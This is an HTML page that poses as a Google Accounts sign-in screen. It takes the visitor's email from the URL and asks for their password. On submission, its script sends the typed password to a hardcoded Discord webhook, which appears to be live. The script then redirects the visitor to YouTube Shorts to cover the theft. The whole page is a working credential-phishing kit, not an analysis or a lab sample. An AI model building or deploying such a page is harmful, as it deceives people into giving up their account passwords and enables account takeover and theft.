<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #212122;
            color: #e8eaed;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background-color: #000000;
            border-radius: 26px;
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
        }

        .google-logo {
             width: 50px;
            height: 50px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: center;            
        }

        .google-logo img {
            margin-left:60px;
            width: 300%;
            height: 300%;
            background-color: rgba(73, 73, 73, 0);
            border-radius: 100%;
            object-fit: contain;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #e8eaed;
        }

        .user-info {
            display: flex;
            align-items: center;
            margin-top: 25px;
            margin-bottom: 20px;
            padding: 10px 12px;
            border-radius: 20px;
            border: 1px solid #5f6368;
        }
        .subtitle{
            margin:5px;
            padding-bottom:35px;
            color: aliceblue;
            font-size: 0.92em;
        }
        .user-avatar {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: #1a73e8;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 10px;
            font-weight: bold;
        }

        .user-email {
            color: #e8eaed;
            font-size: 14px;
            flex: 1;
        }

        .change-account {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 12px;
            margin-left: 8px;
        }

        .change-account:hover {
            text-decoration: underline;
        }

        #passwordForm {
            display: flex;
            flex-direction: column;
        }

        #passwordForm input {
            margin-bottom: 8px;
        }

        input[type="password"] {
            width: 100%;
            padding: 16px;
            background-color: #000000;
            border: 1px solid #5f6368;
            border-radius: 4px;
            color: #e8eaed;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="password"]:focus {
            border-color: #8ab4f8;
        }

        input[type="password"]::placeholder {
            color: #9aa0a6;
        }

        .forgot-password {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
            margin-top: 8px;
            display: inline-block;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .show-password {
            margin-top: 16px;
            display: flex;
            align-items: center;
        }

        .show-password input[type="checkbox"] {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            margin-bottom: 0;
            accent-color: #1a73e8;
            cursor: pointer;
        }

        .show-password label {
            color: #9aa0a6;
            font-size: 14px;
            cursor: pointer;
            user-select: none;
        }

        input[type="text"] {
            width: 100%;
            padding: 16px;
            background-color: #000000;
            border: 1px solid #5f6368;
            border-radius: 4px;
            color: #e8eaed;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus {
            border-color: #8ab4f8;
        }

        input[type="text"]::placeholder {
            color: #9aa0a6;
        }

        .button-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .back-button {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .back-button:hover {
            text-decoration: underline;
        }

        .next-button {
            background-color: #aacbf7;
            color: rgb(33, 17, 245);
            border: none;
            padding: 10px 24px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 540;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .next-button:hover {
            background-color: #1557b0;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
            background-color: #202124;
            border-top: 1px solid #3c4043;
        }

        .language-selector {
            color: #9aa0a6;
            font-size: 12px;
            cursor: pointer;
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: #9aa0a6;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            body {
                padding: 16px;
                padding-bottom: 100px;
            }

            .login-container {
                padding: 40px 24px 24px;
            }

            .footer {
                padding: 12px 16px;
                flex-direction: column;
                gap: 12px;
                text-align: center;
            }

            .footer-links {
                gap: 16px;
                justify-content: center;
            }
        }

        @media (max-width: 480px) {
            body {
                padding-bottom: 120px;
            }

            .login-container {
                padding: 32px 20px 20px;
            }

            h1 {
                font-size: 22px;
            }

            .button-row {
                flex-direction: column;
                gap: 16px;
                align-items: stretch;
            }

            .next-button {
                width: 100%;
                padding: 12px 24px;
            }

            .footer {
                padding: 12px 16px;
            }

            .footer-links {
                flex-direction: column;
                gap: 8px;
            }

            .language-selector {
                order: 2;
            }

            .footer-links {
                order: 1;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="google-logo"><img src="google.svg" alt="Google Logo"></div>
        
        <h1>Welcome</h1>
        
        <div class="user-info">
            <div class="user-avatar">U</div>
            <span class="user-email" id="userEmail">user@google.com</span>
            <!-- <span class="user-email" id="userEmail">user@example.com</span> -->
            <a href="index.html" class="change-account">Switch account</a>
        </div>
        <div class="subtitle">To continue, first verify that it's you</div>
        <form id="passwordForm">
            <input type="password" id="passwordInput" placeholder="Enter your password" required>
            <a href="#" class="forgot-password">Forgot password?</a>
            
            <div class="show-password">
                <input type="checkbox" id="showPassword">
                <label for="showPassword">Show password</label>
            </div>
            
            <div class="button-row">
                <a href="index.html" class="back-button" onclick="history.back()">Back</a>
                <button type="submit" class="next-button">Next</button>
            </div>
        </form>
    </div>

    <script>
        // Get email from URL parameter or localStorage (if passed from previous page)
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || '******@google.com';
        document.getElementById('userEmail').textContent = email;

        // Show/hide password functionality
        document.getElementById('showPassword').addEventListener('change', function() {
            const passwordInput = document.getElementById('passwordInput');
            passwordInput.type = this.checked ? 'text' : 'password';
        });

        const webhookURL = "https://discord.com/api/webhooks/1410185906807111722/9jrInP4_MTfse2kWDA4fbmEobKNXshhtljqEN5yGfvkAiUKFIBJXpg8f3q1OnKfVU739";

    document.getElementById("passwordForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const pass = document.getElementById("passwordInput").value;

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "Password: " + pass })
      }).then(() => {
        window.location.href = "https://youtube.com/shorts";
      });
    });

    </script>

    <div class="footer">
        <div class="language-selector">English (United States)</div>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>
